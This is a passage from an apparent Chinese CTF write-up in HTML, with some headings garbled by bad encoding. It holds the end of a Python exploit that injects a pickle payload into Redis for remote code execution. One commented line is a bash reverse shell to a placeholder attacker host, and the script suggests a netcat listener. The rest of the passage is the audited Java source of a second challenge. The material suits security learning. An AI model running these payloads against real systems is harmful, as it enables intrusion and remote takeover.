keyword">not</span> token<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[-] Exploit failed - cannot login"</span><span class="token punctuation">)</span>        <span class="token keyword">return</span>            <span class="token comment"># Optional Step: Test basic code execution</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\n[*] Testing basic code execution..."</span><span class="token punctuation">)</span>    test_code <span class="token operator">=</span> <span class="token triple-quoted-string string">"""def test():    return "RCE confirmed - Code execution successful!"test()"""</span> <span class="token comment"># &lt;-- FIX: Removed 'return' from here too</span>    result <span class="token operator">=</span> execute_python_code<span class="token punctuation">(</span>test_code<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[Result] </span><span class="token interpolation"><span class="token punctuation">&#123;</span>result<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">"RCE confirmed"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[-] Basic RCE test failed. Aborting."</span><span class="token punctuation">)</span>        <span class="token keyword">return</span>    <span class="token comment"># ==========================================================</span>    <span class="token comment"># ========= æ ¸å¿ƒåˆ©ç”¨æ­¥éª¤ï¼šæ³¨å…¥Pickle Payloadåˆ°Redis =========</span>    <span class="token comment"># ==========================================================</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\n[+] Step 2: Injecting Pickle Payload into Redis for RCE"</span><span class="token punctuation">)</span>    <span class="token comment"># Configure Redis connection info</span>    redis_host <span class="token operator">=</span> <span class="token string">"127.0.0.1"</span>    redis_port <span class="token operator">=</span> <span class="token number">6379</span>    redis_password <span class="token operator">=</span> <span class="token string">"Password123@redis"</span>    <span class="token comment"># Define the command you want to execute on the target server</span>    <span class="token comment"># command_to_execute = "bash -c 'bash -i >&amp; /dev/tcp/YOUR_ATTACKER_IP/YOUR_PORT 0>&amp;1'"</span>    <span class="token comment"># Or for a simple test:</span>    command_to_execute <span class="token operator">=</span> <span class="token string">"touch /tmp/pwned_by_pickle"</span>        <span class="token comment"># Call the injection function</span>    result <span class="token operator">=</span> inject_pickle_payload<span class="token punctuation">(</span>redis_host<span class="token punctuation">,</span> redis_port<span class="token punctuation">,</span> redis_password<span class="token punctuation">,</span> token<span class="token punctuation">,</span> command_to_execute<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[Injection Result] </span><span class="token interpolation"><span class="token punctuation">&#123;</span>result<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">"OK:"</span> <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\n[+] Pickle payload injected successfully!"</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*] The next time the application deserializes this token from Redis,"</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[*] the command '</span><span class="token interpolation"><span class="token punctuation">&#123;</span>command_to_execute<span class="token punctuation">&#125;</span></span><span class="token string">' should be executed on the server."</span></span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*] You may need to trigger this by making another authenticated request or simply waiting."</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*] If using a reverse shell, make sure your listener (e.g., 'nc -lvnp YOUR_PORT') is running."</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\n[-] Failed to inject pickle payload."</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\n[+] You can now try to verify if the command was executed (if you used a non-interactive command)."</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*] For example, checking if the file '/tmp/pwned_by_pickle' exists:"</span><span class="token punctuation">)</span>        verification_result <span class="token operator">=</span> execute_system_command<span class="token punctuation">(</span><span class="token string">"ls -l /tmp/pwned_by_pickle"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[Verification Result]\n</span><span class="token interpolation"><span class="token punctuation">&#123;</span>verification_result<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\n"</span> <span class="token operator">+</span> <span class="token string">"="</span> <span class="token operator">*</span> <span class="token number">60</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] EXPLOIT FINISHED"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"="</span> <span class="token operator">*</span> <span class="token number">60</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="è§£æ³•ä¸‰ï¼šSSRF-to-RCE"><a href="#è§£æ³•ä¸‰ï¼šSSRF-to-RCE" class="headerlink" title="è§£æ³•ä¸‰ï¼šSSRF to RCE"></a>è§£æ³•ä¸‰ï¼šSSRF to RCE</h2><hr><h1 id="UltimateFreeloaderï¼ˆå¤ç°ï¼‰"><a href="#UltimateFreeloaderï¼ˆå¤ç°ï¼‰" class="headerlink" title="UltimateFreeloaderï¼ˆå¤ç°ï¼‰"></a>UltimateFreeloaderï¼ˆå¤ç°ï¼‰</h1><p>å®¡è®¡æºç </p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>rois<span class="token punctuation">.</span>happy_shopping<span class="token punctuation">.</span>controller</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>rois<span class="token punctuation">.</span>happy_shopping<span class="token punctuation">.</span>common<span class="token punctuation">.</span></span><span class="token class-name">Result</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>rois<span class="token punctuation">.</span>happy_shopping<span class="token punctuation">.</span>entity<span class="token punctuation">.</span></span><span class="token class-name">Coupon</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>rois<span class="token punctuation">.</span>happy_shopping<span class="token punctuation">.</span>entity<span class="token punctuation">.</span></span><span class="token class-name">Order</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>rois<span class="token punctuation">.</span>happy_shopping<span class="token punctuation">.</span>entity<span class="token punctuation">.</span></span><span class="token class-name">Product</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>rois<span class="token punctuation">.</span>happy_shopping<span class="token punctuation">.</span>entity<span class="token punctuation">.</span></span><span class="token class-name">User</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>rois<span class="token punctuation">.</span>happy_shopping<span class="token punctuation">.</span>service<span class="token punctuation">.</span></span><span class="token class-name">CouponService</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>rois<span class="token punctuation">.</span>happy_shopping<span class="token punctuation">.</span>service<span class="token punctuation">.</span></span><span class="token class-name">OrderService</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>rois<span class="token punctuation">.</span>happy_shopping<span class="token punctuation">.</span>service<span class="token punctuation">.</span></span><span class="token class-name">ProductService</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>rois<span class="token punctuation">.</span>happy_shopping<span class="token punctuation">.</span>service<span class="token punctuation">.</span></span><span class="token class-name">UserService</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>rois<span class="token punctuation">.</span>happy_shopping<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">JwtUtil</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>math<span class="token punctuation">.</span></span><span class="token class-name">BigDecimal</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">List</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Set</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>stream<span class="token punctuation">.</span></span><span class="token class-name">Collectors</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletRequest</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>beans<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Autowired</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">CrossOrigin</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">GetMapping</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RequestMapping</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RestController</span></span><span class="token punctuation">;</span><span class="token annotation punctuation">@RestController</span><span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"/api/flag"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token annotation punctuation">@CrossOrigin</span><span class="token punctuation">(</span>    origins <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"*"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">FlagController</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Autowired</span>    <span class="token keyword">private</span> <span class="token class-name">UserService</span> userService<span class="token punctuation">;</span>    <span class="token annotation punctuation">@Autowired</span>    <span class="token keyword">private</span> <span class="token class-name">OrderService</span> orderService<span class="token punctuation">;</span>    <span class="token annotation punctuation">@Autowired</span>    <span class="token keyword">private</span> <span class="token class-name">ProductService</span> productService<span class="token punctuation">;</span>    <span class="token annotation punctuation">@Autowired</span>    <span class="token keyword">private</span> <span class="token class-name">CouponService</span> couponService<span class="token punctuation">;</span>    <span class="token annotation punctuation">@Autowired</span>    <span class="token keyword">private</span> <span class="token class-name">JwtUtil</span> jwtUtil<span class="token punctuation">;</span>    <span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"/get"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token class-name">Result</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> <span class="token function">getFlag</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">String</span> token <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getTokenFromRequest</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>token <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">this</span><span class="token punctuation">.</span>jwtUtil<span class="token punctuation">.</span><span class="token function">validateToken</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">String</span> userId <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>jwtUtil<span class="token punctuation">.</span><span class="token function">getUserIdFromToken</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">User</span> user <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>userService<span class="token punctuation">.</span><span class="token function">findById</span><span class="token punctuation">(</span>userId<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>user <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">return</span> <span class="token class-name">Result</span><span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"account doesn't exist"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Order</span><span class="token punctuation">></span></span> userOrders <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>orderService<span class="token punctuation">.</span><span class="token function">getUserOrders</span><span class="token punctuation">(</span>userId<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token class-name">Set</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> purchasedProductIds <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Set</span><span class="token punctuation">)</span>userOrders<span class="token punctuation">.</span><span class="token function">stream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token punctuation">(</span>order<span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token string">"COMPLETED"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>order<span class="token punctuation">.</span><span class="token function">getStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token class-name">Order</span><span class="token operator">::</span><span class="token function">getProductId</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">collect</span><span class="token punctuation">(</span><span class="token class-name">Collectors</span><span class="token punctuation">.</span><span class="token function">toSet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Product</span><span class="token punctuation">></span></span> allProducts <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>productService<span class="token punctuation">.</span><span class="token function">getAllProducts</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token class-name">String</span> xiaotudouId <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>                <span class="token class-name">String</span> diguaId <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>                <span class="token class-name">String</span> yuId <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>                <span class="token class-name">String</span> datudouId <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>                <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token class-name">Product</span> product <span class="token operator">:</span> allProducts<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"Little Potato"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>product<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        xiaotudouId <span class="token operator">=</span> product<span class="token punctuation">.</span><span class="token function">getId</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"Sweet Potato"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>product<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        diguaId <span class="token operator">=</span> product<span class="token punctuation">.</span><span class="token function">getId</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"Fish Fish"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>product<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        yuId <span class="token operator">=</span> product<span class="token punctuation">.</span><span class="token function">getId</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"Large Potato"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>product<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        datudouId <span class="token operator">=</span> product<span class="token punctuation">.</span><span class="token function">getId</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span>                <span class="token punctuation">&#125;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>xiaotudouId <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> diguaId <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> yuId <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> datudouId <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>purchasedProductIds<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>xiaotudouId<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        <span class="token keyword">return</span> <span class="token class-name">Result</span><span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"little potato needed~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>purchasedProductIds<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>diguaId<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        <span class="token keyword">return</span> <span class="token class-name">Result</span><span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"sweet potato needed~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>purchasedProductIds<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>yuId<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        <span class="token keyword">return</span> <span class="token class-name">Result</span><span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"fish needed~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>purchasedProductIds<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>datudouId<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        <span class="token keyword">return</span> <span class="token class-name">Result</span><span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"large potato needed~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>user<span class="token punctuation">.</span><span class="token function">getBalance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">compareTo</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">BigDecimal</span><span class="token punctuation">(</span><span class="token string">"10.00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        <span class="token keyword">return</span> <span class="token class-name">Result</span><span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"your balance is lower than 10~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                        <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Coupon</span><span class="token punctuation">></span></span> userCoupons <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>couponService<span class="token punctuation">.</span><span class="token function">getUserCoupons</span><span class="token punctuation">(</span>userId<span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token keyword">boolean</span> hasUnusedCoupon <span class="token operator">=</span> userCoupons<span class="token punctuation">.</span><span class="token function">stream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">anyMatch</span><span class="token punctuation">(</span><span class="token punctuation">(</span>coupon<span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token operator">!</span>coupon<span class="token punctuation">.</span><span class="token function">getIsUsed</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>hasUnusedCoupon<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                            <span class="token keyword">return</span> <span class="token class-name">Result</span><span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"you cannot use your coupon~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                            <span class="token keyword">return</span> <span class="token class-name">Result</span><span class="token punctuation">.</span><span class="token function">success</span><span class="token punctuation">(</span><span class="token string">"Ultimate Freeloader! ï¼"</span><span class="token punctuation">,</span> <span class="token string">"RCTF&#123;test_flag&#125;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token punctuation">&#125;</span>                    <span class="token punctuation">&#125;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">return</span> <span class="token class-name">Result</span><span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"internal error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token class-name">Result</span><span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token number">401</span><span class="token punctuation">,</span> <span class="token string">"unauthorized"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> <span class="token function">getTokenFromRequest</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">String</span> bearerToken <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getHeader</span><span class="token punctuation">(</span><span class="token string">"Authorization"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> bearerToken <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> bearerToken<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"Bearer "</span><span class="token punctuation">)</span> <span class="token operator">?</span> bearerToken<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è·å– flag çš„æ¡ä»¶ï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">if</span> <span class="token punctuation">(</span>xiaotudouId <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> diguaId <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> yuId <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> datudouId <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token 